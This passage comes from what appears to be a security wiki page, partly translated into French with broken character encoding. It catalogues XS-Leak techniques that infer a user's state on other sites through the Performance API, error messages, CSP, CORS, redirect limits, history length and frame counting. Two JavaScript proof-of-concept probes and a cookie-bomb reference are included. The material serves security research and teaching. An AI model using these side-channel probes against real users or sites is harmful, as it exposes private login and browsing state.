Cette richesse de donn√©es peut √™tre r√©cup√©r√©e via des m√©thodes comme [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ou [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), fournissant une vue compl√®te des informations li√©es √† la performance. De plus, l'API facilite la mesure des temps d'ex√©cution en calculant la diff√©rence entre les horodatages obtenus √† partir de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Cependant, il convient de noter que pour certaines op√©rations dans des navigateurs comme Chrome, la pr√©cision de `performance.now()` peut √™tre limit√©e aux millisecondes, ce qui pourrait affecter la granularit√© des mesures de timing.

Au-del√† des mesures de timing, l'API de Performance peut √™tre exploit√©e pour des aper√ßus li√©s √† la s√©curit√©. Par exemple, la pr√©sence ou l'absence de pages dans l'objet `performance` dans Chrome peut indiquer l'application de `X-Frame-Options`. Plus pr√©cis√©ment, si une page est bloqu√©e de son rendu dans un cadre en raison de `X-Frame-Options`, elle ne sera pas enregistr√©e dans l'objet `performance`, fournissant un indice subtil sur les politiques de cadre de la page.

### Error Leak

* **Inclusion Methods**: Frames, √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Une requ√™te qui entra√Æne des erreurs ne cr√©era pas d'entr√©e de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Il est possible de **diff√©rencier entre les codes d'√©tat de r√©ponse HTTP** car les requ√™tes qui entra√Ænent une **erreur** ne **cr√©ent pas d'entr√©e de performance**.

### Style Reload Error

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** En raison d'un bug du navigateur, les requ√™tes qui entra√Ænent des erreurs sont charg√©es deux fois.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Dans la technique pr√©c√©dente, deux cas ont √©galement √©t√© identifi√©s o√π des bugs du navigateur dans GC entra√Ænent des **ressources √©tant charg√©es deux fois lorsqu'elles √©chouent √† se charger**. Cela entra√Ænera plusieurs entr√©es dans l'API de Performance et peut donc √™tre d√©tect√©.

### Request Merging Error

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les requ√™tes qui entra√Ænent une erreur ne peuvent pas √™tre fusionn√©es.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La technique a √©t√© trouv√©e dans un tableau dans le document mentionn√© mais aucune description de la technique n'a √©t√© trouv√©e. Cependant, vous pouvez trouver le code source en v√©rifiant [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les r√©ponses vides ne cr√©ent pas d'entr√©es de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un attaquant peut d√©tecter si une requ√™te a entra√Æn√© un corps de r√©ponse HTTP vide car les **pages vides ne cr√©ent pas d'entr√©e de performance dans certains navigateurs**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** En utilisant l'Auditeur XSS dans les Assertions de S√©curit√©, les attaquants peuvent d√©tecter des √©l√©ments sp√©cifiques de la page web en observant les modifications dans les r√©ponses lorsque des charges utiles con√ßues d√©clenchent le m√©canisme de filtrage de l'auditeur.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Dans les Assertions de S√©curit√© (SA), l'Auditeur XSS, initialement destin√© √† pr√©venir les attaques de Cross-Site Scripting (XSS), peut paradoxalement √™tre exploit√© pour fuir des informations sensibles. Bien que cette fonctionnalit√© int√©gr√©e ait √©t√© supprim√©e de Google Chrome (GC), elle est toujours pr√©sente dans SA. En 2013, Braun et Heiderich ont d√©montr√© que l'Auditeur XSS pouvait bloquer involontairement des scripts l√©gitimes, entra√Ænant de faux positifs. S'appuyant sur cela, des chercheurs ont d√©velopp√© des techniques pour extraire des informations et d√©tecter un contenu sp√©cifique sur des pages d'origine crois√©e, un concept connu sous le nom de XS-Leaks, initialement rapport√© par Terada et √©labor√© par Heyes dans un article de blog. Bien que ces techniques soient sp√©cifiques √† l'Auditeur XSS dans GC, il a √©t√© d√©couvert que dans SA, les pages bloqu√©es par l'Auditeur XSS ne g√©n√®rent pas d'entr√©es dans l'API de Performance, r√©v√©lant une m√©thode par laquelle des informations sensibles pourraient encore √™tre divulgu√©es.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: En-t√™te
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Une ressource avec un en-t√™te X-Frame-Options ne cr√©e pas d'entr√©e de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Si une page n'est **pas autoris√©e** √† √™tre **rendu** dans un **iframe**, elle ne **cr√©e pas d'entr√©e de performance**. En cons√©quence, un attaquant peut d√©tecter l'en-t√™te de r√©ponse **`X-Frame-Options`**.\
Il en va de m√™me si vous utilisez une **balise embed**.

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: En-t√™te
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les t√©l√©chargements ne cr√©ent pas d'entr√©es de timing de ressource dans l'API de Performance.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

De mani√®re similaire √† la fuite XS d√©crite, une **ressource qui est t√©l√©charg√©e** en raison de l'en-t√™te ContentDisposition ne **cr√©e pas non plus d'entr√©e de performance**. Cette technique fonctionne dans tous les navigateurs majeurs.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirection
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** L'entr√©e de timing de ressource r√©v√®le le temps de d√©but d'une redirection.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Nous avons trouv√© un cas de fuite XS qui abuse du comportement de certains navigateurs qui enregistrent trop d'informations pour les requ√™tes d'origine crois√©e. La norme d√©finit un sous-ensemble d'attributs qui doivent √™tre d√©finis √† z√©ro pour les ressources d'origine crois√©e. Cependant, dans **SA**, il est possible de d√©tecter si l'utilisateur est **redirig√©** par la page cible, en interrogeant l'**API de Performance** et en v√©rifiant les **donn√©es de timing redirectStart**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirection
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** La dur√©e des entr√©es de timing est n√©gative lorsqu'une redirection se produit.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Dans GC, la **dur√©e** pour les requ√™tes qui entra√Ænent une **redirection** est **n√©gative** et peut donc √™tre **distingu√©e** des requ√™tes qui ne r√©sultent pas en une redirection.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: En-t√™te
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Les ressources prot√©g√©es par CORP ne cr√©ent pas d'entr√©es de timing de ressource.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Dans certains cas, l'entr√©e **nextHopProtocol** peut √™tre utilis√©e comme technique de fuite. Dans GC, lorsque l'en-t√™te **CORP** est d√©fini, le nextHopProtocol sera **vide**. Notez que SA ne cr√©era pas d'entr√©e de performance du tout pour les ressources activ√©es par CORP.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** D√©tecter si un service worker est enregistr√© pour une origine sp√©cifique.
* **Code Example**:

Les service workers sont des contextes de script d√©clench√©s par des √©v√©nements qui s'ex√©cutent √† une origine. Ils s'ex√©cutent en arri√®re-plan d'une page web et peuvent intercepter, modifier et **mettre en cache des ressources** pour cr√©er des applications web hors ligne.\
Si une **ressource mise en cache** par un **service worker** est acc√©d√©e via **iframe**, la ressource sera **charg√©e √† partir du cache du service worker**.\
Pour d√©tecter si la ressource a √©t√© **charg√©e √† partir du cache du service worker**, l'**API de Performance** peut √™tre utilis√©e.\
Cela pourrait √©galement √™tre fait avec une attaque de timing (voir le document pour plus d'infos).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Il est possible de v√©rifier si une ressource a √©t√© stock√©e dans le cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

En utilisant l'[API de Performance](xs-search.md#performance-api), il est possible de v√©rifier si une ressource est mise en cache.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Il est possible de r√©cup√©rer la dur√©e r√©seau d'une requ√™te √† partir de l'API `performance`.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Technique des Messages d'Erreur

### Media Error

* **Inclusion Methods**: √âl√©ments HTML (Vid√©o, Audio)
* **Detectable Difference**: Code d'√©tat
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** Dans Firefox, il est possible de fuir avec pr√©cision le code d'√©tat d'une requ√™te d'origine crois√©e.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` interface's message property uniquely identifies resources that load successfully with a distinct string. An attacker can exploit this feature by observing the message content, thereby deducing the response status of a cross-origin resource.

### CORS Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** Dans les assertions de s√©curit√© (SA), les messages d'erreur CORS exposent involontairement l'URL compl√®te des requ√™tes redirig√©es.
* **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

This technique enables an attacker to **extract the destination of a cross-origin site's redirect** by exploiting how Webkit-based browsers handle CORS requests. Specifically, when a **CORS-enabled request** is sent to a target site that issues a redirect based on user state and the browser subsequently denies the request, the **full URL of the redirect's target** is disclosed within the error message. This vulnerability not only reveals the fact of the redirect but also exposes the redirect's endpoint and any **sensitive query parameters** it may contain.

### SRI Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** Dans les assertions de s√©curit√© (SA), les messages d'erreur CORS exposent involontairement l'URL compl√®te des requ√™tes redirig√©es.
* **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

An attacker can exploit **verbose error messages** to deduce the size of cross-origin responses. This is possible due to the mechanism of Subresource Integrity (SRI), which uses the integrity attribute to validate that resources fetched, often from CDNs, haven't been tampered with. For SRI to work on cross-origin resources, these must be **CORS-enabled**; otherwise, they're not subject to integrity checks. In Security Assertions (SA), much like the CORS error XS-Leak, an error message can be captured after a fetch request with an integrity attribute fails. Attackers can deliberately **trigger this error** by assigning a **bogus hash value** to the integrity attribute of any request. In SA, the resulting error message inadvertently reveals the content length of the requested resource. This information leakage allows an attacker to discern variations in response size, paving the way for sophisticated XS-Leak attacks.

### CSP Violation/Detection

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Summary:** En autorisant uniquement le site Web de la victime dans le CSP, si nous y acc√©dons et qu'il essaie de rediriger vers un domaine diff√©rent, le CSP d√©clenchera une erreur d√©tectable.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

A XS-Leak can use the CSP to detect if a cross-origin site was redirected to a different origin. This leak can detect the redirect, but additionally, the domain of the redirect target leaks. The basic idea of this attack is to **allow the target domain on the attacker site**. Once a request is issued to the target domain, it **redirects** to a cross-origin domain. **CSP blocks** the access to it and creates a **violation report used as a leak technique**. Depending on the browser, **this report may leak the target location of the redirect**.\
Modern browsers won't indicate the URL it was redirected to, but you can still detect that a cross-origin redirect was triggered.

### Cache

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Summary:** Effacer le fichier du cache. Ouvre la page cible et v√©rifie si le fichier est pr√©sent dans le cache.
* **Code Example:**

Browsers might use one shared cache for all websites. Regardless of their origin, it is possible to deduct whether a target page has **requested a specific file**.

If a page loads an image only if the user is logged in, you can **invalidate** the **resource** (so it's no longer cached if it was, see more info links), **perform a request** that could load that resource and try to load the resource **with a bad request** (e.g. using an overlong referer header). If the resource load **didn't trigger any error**, it's because it was **cached**.

### CSP Directive

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Summary:** Les directives d'en-t√™te CSP peuvent √™tre test√©es √† l'aide de l'attribut iframe CSP, r√©v√©lant des d√©tails sur la politique.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

A novel feature in Google Chrome (GC) allows web pages to **propose a Content Security Policy (CSP)** by setting an attribute on an iframe element, with policy directives transmitted along with the HTTP request. Normally, the embedded content must **authorize this via an HTTP header**, or an **error page is displayed**. However, if the iframe is already governed by a CSP and the newly proposed policy isn't more restrictive, the page will load normally. This mechanism opens a pathway for an attacker to **detect specific CSP directives** of a cross-origin page by identifying the error page. Although this vulnerability was marked as fixed, our findings reveal a **new leak technique** capable of detecting the error page, suggesting that the underlying problem was never fully addressed.

### **CORP**

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Summary:** Les ressources s√©curis√©es par la politique de ressources cross-origin (CORP) g√©n√©reront une erreur lorsqu'elles sont r√©cup√©r√©es depuis une origine non autoris√©e.
* **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

The CORP header is a relatively new web platform security feature that when set b**locks no-cors cross-origin requests to the given resource**. The presence of the header can be detected, because a resource protected with CORP will **throw an error when fetched**.

### CORB

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Summary**: CORB peut permettre aux attaquants de d√©tecter lorsque l'**en-t√™te `nosniff` est pr√©sent** dans la requ√™te.
* **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Check the link for more information about the attack.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Summary**: Si l'en-t√™te Origin est refl√©t√© dans l'en-t√™te `Access-Control-Allow-Origin`, il est possible de v√©rifier si une ressource est d√©j√† dans le cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

In case the **Origin header** is being **reflected** in the header `Access-Control-Allow-Origin` an attacker can abuse this behaviour to try to **fetch** the **resource** in **CORS** mode. If an **error** **isn't** triggered, it means that it was **correctly retrieved form the web**, if an error is **triggered**, it's because it was **accessed from the cache** (the error appears because the cache saves a response with a CORS header allowing the original domain and not the attackers domain)**.**\
Note that if the origin isn't reflected but a wildcard is used (`Access-Control-Allow-Origin: *`) this won't work.

## Readable Attributes Technique

### Fetch Redirect

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Status Code
* **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Summary:** GC et SA permettent de v√©rifier le type de r√©ponse (opaque-redirect) apr√®s que la redirection soit termin√©e.
* **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Submitting a request using the Fetch API with `redirect: "manual"` and other params, it's possible to read the `response.type` attribute and if it's equals to `opaqueredirect` then the response was a redirect.

### COOP

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Summary:** Les pages prot√©g√©es par la politique d'ouverture cross-origin (COOP) emp√™chent l'acc√®s aux interactions cross-origin.
* **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

An attacker is capable of deducing the presence of the Cross-Origin Opener Policy (COOP) header in a cross-origin HTTP response. COOP is utilized by web applications to hinder external sites from obtaining arbitrary window references. The visibility of this header can be discerned by attempting to access the **`contentWindow` reference**. In scenarios where COOP is applied conditionally, the **`opener` property** becomes a telltale indicator: it's **undefined** when COOP is active, and **defined** in its absence.

### URL Max Length - Server Side

* **Inclusion Methods**: Fetch API, HTML Elements
* **Detectable Difference**: Status Code / Content
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Summary:** D√©tecter les diff√©rences dans les r√©ponses parce que la longueur de la r√©ponse de redirection pourrait √™tre trop grande pour que le serveur r√©ponde avec une erreur et qu'une alerte soit g√©n√©r√©e.
* **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

If a server-side redirect uses **user input inside the redirection** and **extra data**. It's possible to detect this behaviour because usually **servers** has a **limit request length**. If the **user data** is that **length - 1**, because the **redirect** is using **that data** and **adding** something **extra**, it will trigger an **error detectable via Error Events**.

If you can somehow set cookies to a user, you can also perform this attack by **setting enough cookies** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) so with the **response increased size** of the **correct response** an **error** is triggered. In this case, remember that is you trigger this request from a same site, `<script>` will automatically send the cookies (so you can check for errors).\
An example of the **cookie bomb + XS-Search** can be found in the Intended solution of this writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` or to be in the same context is usually needed for this type of attack.

### URL Max Length - Client Side

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code / Content
* **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Summary:** D√©tecter les diff√©rences dans les r√©ponses parce que la longueur de la r√©ponse de redirection pourrait √™tre trop grande pour qu'une diff√©rence puisse √™tre remarqu√©e.
* **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

According to [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), Chrome's maximum URL length is 2MB.

> In general, the _web platform_ does not have limits on the length of URLs (although 2^31 is a common limit). _Chrome_ limits URLs to a maximum length of **2MB** for practical reasons and to avoid causing denial-of-service problems in inter-process communication.

Therefore if the **redirect URL responded is larger in one of the cases**, it's possible to make it redirect with a **URL larger than 2MB** to hit the **length limit**. When this happens, Chrome shows an **`about:blank#blocked`** page.

The **noticeable difference**, is that if the **redirect** was **completed**, `window.origin` throws an **error** because a cross origin cannot access that info. However, if the **limit** was \*\*\*\* hit and the loaded page was **`about:blank#blocked`** the window's **`origin`** remains that of the **parent**, which is an **accessible information.**

All the extra info needed to reach the **2MB** can be added via a **hash** in the initial URL so it will be **used in the redirect**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Max Redirects

* **Inclusion Methods**: Fetch API, Frames
* **Detectable Difference**: Status Code
* **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Summary:** Utiliser la limite de redirection du navigateur pour d√©terminer la survenue de redirections d'URL.
* **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

If the **max** number of **redirects** to follow of a browser is **20**, an attacker could try to load his page with **19 redirects** and finally **send the victim** to the tested page. If an **error** is triggered, then the page was trying to **redirect the victim**.

### History Length

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Redirects
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Summary:** Le code JavaScript manipule l'historique du navigateur et peut √™tre accessible par la propri√©t√© length.
* **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

The **History API** allows JavaScript code to manipulate the browser history, which **saves the pages visited by a user**. An attacker can use the length property as an inclusion method: to detect JavaScript and HTML navigation.\
**Checking `history.length`**, making a user **navigate** to a page, **change** it **back** to the same-origin and **checking** the new value of **`history.length`**.

### History Length with same URL

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: If URL is the same as the guessed one
* **Summary:** Il est possible de deviner si l'emplacement d'un cadre/pop-up est dans une URL sp√©cifique en abusant de la longueur de l'historique.
* **Code Example**: Below

An attacker could use JavaScript code to **manipulate the frame/pop-up location to a guessed one** and **immediately** **change it to `about:blank`**. If the history length increased it means the URL was correct and it had time to **increase because the URL isn't reloaded if it's the same**. If it didn't increased it means it **tried to load the guessed URL** but because we **immediately after** loaded **`about:blank`**, the **history length did never increase** when loading the guessed url.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** √âvaluer la quantit√© d'√©l√©ments iframe en inspectant la propri√©t√© `window.length`.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Compter le **nombre de frames dans un web** ouvert via `iframe` ou `window.open` peut aider √† identifier le **statut de l'utilisateur sur cette page**.\
De plus, si la page a toujours le m√™me nombre de frames, v√©rifier **en continu** le nombre de frames peut aider √† identifier un **mod√®le** qui pourrait divulguer des informations.

Un exemple de cette technique est que dans chrome, un **PDF** peut √™tre **d√©tect√©** avec **le comptage de frames** car un `embed` est utilis√© en interne. Il existe des [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) qui permettent un certain contr√¥le sur le contenu tel que `zoom`, `view`, `page`, `toolbar` o√π cette technique pourrait √™tre int√©ressante.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Lire la valeur divulgu√©e pour distinguer entre 2 √©tats possibles
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La fuite d'informations √† travers des √©l√©ments HTML est une pr√©occupation en mati√®re de s√©curit√© web, en particulier lorsque des fichiers multim√©dias dynamiques sont g√©n√©r√©s en fonction des informations de l'utilisateur, ou lorsque des filigranes sont ajout√©s, modifiant la taille du m√©dia. Cela peut √™tre exploit√© par des attaquants pour diff√©rencier entre des √©tats possibles en analysant les informations expos√©es par certains √©l√©ments HTML.

### Information Exposed by HTML Elements

